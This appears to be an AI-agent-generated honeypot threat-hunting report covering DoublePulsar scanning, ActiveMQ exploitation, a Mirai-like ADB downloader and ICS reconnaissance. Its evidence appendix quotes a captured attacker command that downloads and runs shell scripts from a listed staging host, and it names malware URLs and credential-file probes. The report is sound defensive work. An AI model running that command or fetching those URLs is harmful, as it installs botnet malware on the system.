# Honeypot Threat Hunting Final Report

## 1) Investigation Scope
- **investigation_start**: `2026-03-12T00:00:07Z`
- **investigation_end**: `2026-03-12T04:00:07Z`
- **completion_status**: Complete
- **degraded_mode**: true
  - **Reason**: The investigation experienced minor tool failures where agents had to self-correct query parameters. Some OSINT searches for specific IOCs did not return definitive public abuse reports, requiring reliance on correlated telemetry.

## 2) Executive Triage Summary
- **Top Services/Ports of Interest**:
    - ADB (Android Debug Bridge) on port 5555
    - SMB (via DoublePulsar) on port 445
    - Apache ActiveMQ on port 61616
    - ICS Protocols: `guardian_ast` (10001), `IEC104` (2404), `kamstrup_management_protocol` (50100)
    - VNC on port 5902 (high-volume scanning)
- **Top Confirmed Known Exploitation**:
    - Widespread scanning and exploitation attempts using the **DoublePulsar** backdoor (SMB, port 445).
    - Targeted exploitation of **Apache ActiveMQ (CVE-2023-46604)** from a botnet node.
- **Top Unmapped Exploit-like Items**: No truly unmapped exploit-like items were validated. However, reconnaissance against specialized Industrial Control System (ICS) protocols represents unusual, targeted activity.
- **Botnet/Campaign Mapping Highlights**:
    - Identified a botnet node (`91.224.92.196`) conducting multi-faceted attacks, including ADB-based malware downloading and Apache ActiveMQ exploitation.
    - The associated staging host (`94.156.152.233`) is confirmed via OSINT as a known **Mirai-like** malware distributor.
- **Major Uncertainties**: The identity and purpose of the `guardian_ast` protocol remains unknown, though it was targeted by known malicious scanners.

## 3) Candidate Discovery Summary
The discovery phase analyzed 37,088 events to identify leads. The primary candidates surfaced were:
- **`BOT-01`**: An ADB-based malware downloader chain.
- **`BOT-02`**: A high-volume `DoublePulsar` exploit campaign.
- **`ODD-01`**: Probing of unusual Industrial Control System (ICS) protocols.
- **`NDE-01`**: Low-volume events matching `CVE-2025-55182`.

A query to directly map source IPs to Suricata alert signatures failed to return results, which slightly hindered initial IP-to-campaign correlation, but was overcome during validation.

## 4) Emerging n-day Exploitation

### DoublePulsar SMB Campaign
- **cve/signature mapping**: `ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication`
- **evidence summary**: 1,509 alert events primarily from source IP `177.101.37.250`. Part of a wider scanning effort on port 445 by multiple IPs.
- **affected service/port**: SMB / Port 445
- **confidence**: High
- **operational notes**: This is a well-known, commodity exploit campaign. The primary source IP should be blocked, and monitoring for large-scale scanning on port 445 should be maintained.

### Apache ActiveMQ RCE Attempt
- **cve/signature mapping**: `CVE-2023-46604` (`ET EXPLOIT Apache ActiveMQ Remote Code Execution Attempt`)
- **evidence summary**: Multiple alerts from source IP `91.224.92.196`. This activity was co-located with ADB malware downloader activity.
- **affected service/port**: Apache ActiveMQ / Port 61616
- **confidence**: High
- **operational notes**: Indicates an attacker using a multi-exploit toolkit. The source IP is part of a broader botnet campaign.

### CVE-2025-55182
- **cve/signature mapping**: `CVE-2025-55182`
- **evidence summary**: 163 events from various sources.
- **affected service/port**: Unknown from initial data.
- **confidence**: Medium
- **operational notes**: Classified as monitor-only. The activity level is low and does not show a clear campaign structure at this time.

## 5) Novel or Zero-Day Exploit Candidates (UNMAPPED ONLY, ranked)
No candidates remained classified as novel or potential zero-day after the validation and OSINT enrichment loop. All observed exploit-like behavior was successfully mapped to known exploits, tools, or commodity scanning patterns.

## 6) Botnet/Campaign Infrastructure Mapping

### `BOT-01`: Mirai-like Downloader & Multi-Exploit Node
- **item_id**: `BOT-01`
- **campaign_shape**: fan-out (one IP attacking multiple services/ports)
- **suspected_compromised_src_ips**: `91.224.92.196` (49 related events)
- **ASNs / geo hints**: ASN 209605 (UAB Host Baltic), United Kingdom
- **suspected_staging indicators**:
    - **Staging Host**: `94.156.152.233` (ASN 14061, DigitalOcean, LLC)
    - **Supporting Evidence**: OSINT confirms this IP is a known C2/staging host for Mirai and Mozi botnets.
    - **Malware URLs**: `http://94.156.152.233/bins/w.sh`, `http://94.156.152.233/bins/c.sh`
- **suspected_c2 indicators**: The staging host `94.156.152.233` is the primary C2 indicator.
- **confidence**: High
- **operational notes**: The source IP `91.224.92.196` should be blocked. The staging host `94.156.152.233` should be added to threat intelligence feeds. The downloaded shell scripts (`w.sh`, `c.sh`) should be acquired and analyzed.

## 7) Odd-Service / Minutia Attacks

### `ODD-01`: ICS Protocol Reconnaissance
- **service_fingerprint**:
    - Port 10001 / `guardian_ast` protocol
    - Port 2404 / `IEC104` protocol
    - Port 50100 / `kamstrup_management_protocol`
- **why it’s unusual/interesting**: This activity represents targeted reconnaissance against specialized Industrial Control System (ICS) and smart meter protocols, which are not typically exposed to the public internet. OSINT confirmed Kamstrup is a real-world smart meter vendor and one of the scanning IPs (`47.77.230.24`) is a known bad actor on multiple blacklists.
- **evidence summary**: 71 total events across the three protocols from a spray of different source IPs.
- **confidence**: High
- **recommended monitoring pivots**: Monitor the identified source IPs for further ICS-related activity. Enhance logging to better parse and alert on these specific protocols.

## 8) Known-Exploit / Commodity Exclusions
- **Credential Noise**: Standard brute-force attempts using common usernames like `root` (211 attempts), `admin` (62 attempts), and `ubuntu` (65 attempts).
- **Scanning**:
    - **VNC Scans**: 23,395 events for `GPL INFO VNC server response`, indicating widespread, non-targeted scanning.
    - **Web App Scans**: 2,240 events from the Tanner honeypot for common sensitive files like `.env`, `.aws/credentials`, and `/proc/self/environ`.
- **Known Bot Patterns**: Activity matching generic signatures like `ET INFO CURL User Agent` (1,205 events) and blocklists like `ET DROP Spamhaus DROP` was observed and excluded as general background noise.

## 9) Infrastructure & Behavioral Classification
- **Exploitation vs Scanning**: The investigation revealed both targeted exploitation (Mirai-like botnet, DoublePulsar) and broad, indiscriminate scanning (VNC, web files).
- **Campaign Shape**:
    - **Fan-out**: The `BOT-01` attacker used one IP to launch multiple, different exploits (ADB, ActiveMQ).
    - **Fan-out / Spray**: The DoublePulsar activity involved many IPs scanning broadly for a single vulnerability.
    - **Spray**: The ICS reconnaissance involved many IPs probing for specific, rare ports.
- **Infra Reuse Indicators**: The `BOT-01` campaign reused a known Mirai/Mozi staging host, confirming its link to established botnet infrastructure.
- **Odd-Service Fingerprints**: Clear evidence of scanning for ICS/SCADA/smart meter protocols (IEC104, Kamstrup) was identified.

## 10) Evidence Appendix

### Novel Exploit Candidate: `BOT-01`
- **source IPs**: `91.224.92.196` (count: 49)
- **ASNs**: 209605 (UAB Host Baltic)
- **target ports/services**: 5555 (ADB), 61616 (Apache ActiveMQ)
- **paths/endpoints**: `http://94.156.152.233/bins/w.sh`, `http://94.156.152.233/bins/c.sh`
- **payload/artifact excerpts**: `cd /data/local/tmp/; busybox wget http://94.156.152.233/bins/w.sh; sh w.sh; curl http://94.156.152.233/bins/c.sh; sh c.sh`
- **staging indicators**: IP: `94.156.152.233`
- **temporal checks results**: All activity occurred within the investigation window.

### Odd-Service Attack: `ODD-01`
- **source IPs with counts**: `47.77.230.24` (15), `204.76.203.233` (12), `185.242.226.39` (14), `185.226.197.29` (7), and others.
- **ASNs with counts**: Not aggregated.
- **target ports/services**: 10001 (guardian_ast), 2404 (IEC104), 50100 (kamstrup_management_protocol)
- **payload/artifact excerpts**: Connection events and protocol handshakes captured by Conpot honeypot.
- **temporal checks results**: All activity occurred within the investigation window.

## 11) Indicators of Interest
- **Attacker IPs**:
  - `91.224.92.196` (Mirai-like botnet node)
  - `177.101.37.250` (DoublePulsar scanner)
  - `47.77.230.24` (Known malicious ICS scanner)
- **Malware Staging/C2 IP**:
  - `94.156.152.233` (Confirmed Mirai/Mozi host)
- **Malware URLs**:
  - `http://94.156.152.233/bins/w.sh`
  - `http://94.156.152.233/bins/c.sh`
- **Signatures / CVEs**:
  - `ET EXPLOIT Apache ActiveMQ Remote Code Execution Attempt (CVE-2023-46604)`
  - `ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication`

## 12) Backend Tool Issues
- **`CandidateDiscoveryAgent`**: The `two_level_terms_aggregated` tool failed to aggregate source IPs against alert signatures. This weakened the initial automated campaign clustering but was mitigated by manual analysis during the validation phase.
- **`CandidateValidationAgent`**: For candidate `ODD-01`, initial queries failed due to incorrect field names (`protocol.keyword`) and type filters (`Conpot` vs `ConPot`). The agent successfully self-corrected by pivoting to use `dest_port` as the primary field for aggregation, demonstrating resilience but highlighting a dependency on precise schema knowledge.

## 13) Agent Action Summary (Audit Trail)

- **agent_name**: ParallelInvestigationAgent
- **purpose**: Conduct broad, parallel queries to gather initial threat landscape data.
- **inputs_used**: `investigation_start`, `investigation_end`.
- **actions_taken**: Executed multiple `get_*` and search queries via sub-agents (`BaselineAgent`, `KnownSignalAgent`, `CredentialNoiseAgent`, `HoneypotSpecificAgent`).
- **key_results**: Produced high-level statistics on total attacks (37,088), top alert signatures (GPL VNC, DoublePulsar), common credentials (`root`, `admin`), and honeypot-specific activity (ADBHoney downloader, Conpot ICS probes).
- **errors_or_gaps**: None.

- **agent_name**: CandidateDiscoveryAgent
- **purpose**: Analyze baseline data to identify and prioritize potential threats for deeper investigation.
- **inputs_used**: All outputs from ParallelInvestigationAgent.
- **actions_taken**: Used `kibanna_discover_query` to find specific artifacts, attempted `two_level_terms_aggregated` for clustering.
- **key_results**: Identified and queued three main candidates (`BOT-01`, `BOT-02`, `ODD-01`) based on malware chains, exploit signatures, and unusual protocol activity.
- **errors_or_gaps**: A key `two_level_terms_aggregated` query failed, preventing an initial IP-to-signature clustering.

- **agent_name**: CandidateValidationLoopAgent
- **purpose**: Iteratively perform deep-dive analysis on each candidate from the discovery queue.
- **inputs_used**: Candidate queue from `CandidateDiscoveryAgent`.
- **actions_taken**: Completed 3 validation iterations for 3 candidates. Used a mix of `kibanna_discover_query`, `events_for_src_ip`, and `two_level_terms_aggregated` to pivot and enrich data.
- **key_results**:
    - Validated `BOT-01` by linking ADB activity to a staging host and a secondary Apache ActiveMQ exploit.
    - Validated `BOT-02` by confirming it as a high-volume, single-purpose DoublePulsar scanner.
    - Validated `ODD-01` by successfully clustering disparate source IPs targeting specific ICS-related ports.
- **errors_or_gaps**: Encountered and recovered from query failures while investigating `ODD-01`, pivoting from a non-existent protocol field to using the destination port.

- **agent_name**: DeepInvestigationLoopController
- **purpose**: Manages the state and flow of the candidate validation loop.
- **inputs_used**: Candidate queue.
- **actions_taken**: Initialized queue, loaded next candidate, executed 3 iterations.
- **key_results**: Ensured all 3 discovered candidates were processed by the validation agent.
- **errors_or_gaps**: None; loop completed successfully.

- **agent_name**: OSINTAgent
- **purpose**: Enrich validated findings with external public intelligence.
- **inputs_used**: Validated candidate reports.
- **actions_taken**: Executed multiple `search` queries on IOCs (IPs, URLs, commands) and signatures.
- **key_results**:
    - Confirmed `BOT-01` infrastructure is part of a known Mirai-like botnet.
    - Confirmed `BOT-02` activity uses a well-documented public exploit tool (DoublePulsar).
    - Increased confidence in `ODD-01`'s significance by linking a scanning IP to public blacklists and identifying the targeted `Kamstrup` protocol as belonging to a real-world smart meter vendor.
- **errors_or_gaps**: Search for the reputation of `177.101.37.250` yielded no public results.

- **agent_name**: ReportAgent
- **purpose**: Compile the final report from all workflow state outputs.
- **inputs_used**: All preceding agent and tool outputs.
- **actions_taken**: Assembled this markdown report.
- **key_results**: Report generated.
- **errors_or_gaps**: None.

- **agent_name**: SaveReportAgent
- **purpose**: Persist the final report.
- **inputs_used**: Final markdown report content.
- **actions_taken**: Called `default_write_file`.
- **key_results**: File write operation initiated.
- **errors_or_gaps**: Status dependent on tool execution.
